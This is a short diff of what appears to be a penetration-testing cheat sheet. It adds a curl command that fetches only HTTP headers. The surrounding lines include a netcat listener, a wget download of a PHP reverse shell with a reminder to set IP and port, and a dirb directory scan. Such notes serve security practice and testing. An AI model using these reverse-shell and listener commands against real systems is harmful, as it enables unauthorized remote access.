@@ -44,6 +44,8 @@ nc -v -n -l -p 1234
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 (remember to change ip and port in php code as needed)
 
+# curl 
+curl -X GET --head http://${HOST}   ## only headers
 
 # directory scanning options
 dirb http://${HOST} /usr/share/dirb/wordlists/big.txt
